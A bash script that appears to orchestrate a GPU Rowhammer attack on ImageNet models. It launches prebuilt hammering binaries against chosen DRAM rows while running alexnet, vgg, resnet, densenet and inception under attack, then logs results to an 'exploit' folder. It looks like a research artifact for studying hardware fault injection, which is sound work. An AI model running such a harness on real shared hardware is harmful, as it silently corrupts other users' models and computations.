# Variables
bank_offset=2048
num_agg=24
num_warp=8
num_thread=3
delay=58
victim_row=3543
min_rowid=$(($victim_row - 94))
max_rowid=$victim_row
row_step=4
count_iter=100
addr_step=256
iterations=91000

for model in alexnet vgg resnet dense inception; do
    echo "Processing $model"

    >  "./exploit/B1/${model}.txt"
    shuf --random-source=<(yes 42) -i 0-4228 -n 1 | while read num; do

        mem_size=$((2786835456 - (256 * $num)))
        printf "$num: ***********************\n"

        rowset_file="./row_sets/ROW_SET_${bank_offset}.txt"

        echo "Start hammering ..."
        nohup ./out/build/hammer_mem_manage $((46 * (2 ** 30))) >/dev/null 2>&1  &
        sleep 2
        nohup ./out/build/hammer_manual_agg_left $rowset_file $((num_agg - 1)) $addr_step $iterations $min_rowid $max_rowid $row_step $mem_size $num_warp $num_thread $delay 1 $count_iter  >/dev/null 2>&1 &
        sleep 5
        python3 ./run_imagenet_models.py $model att B1 ./ ./out/build/liballoc.so "./exploit/B1/${model}.txt"
        sleep 5
        > memory_control.txt
        sleep 5
        echo "Hammering done."
    done
done

rm exploit_control.txt memory_control.txt model_control.txt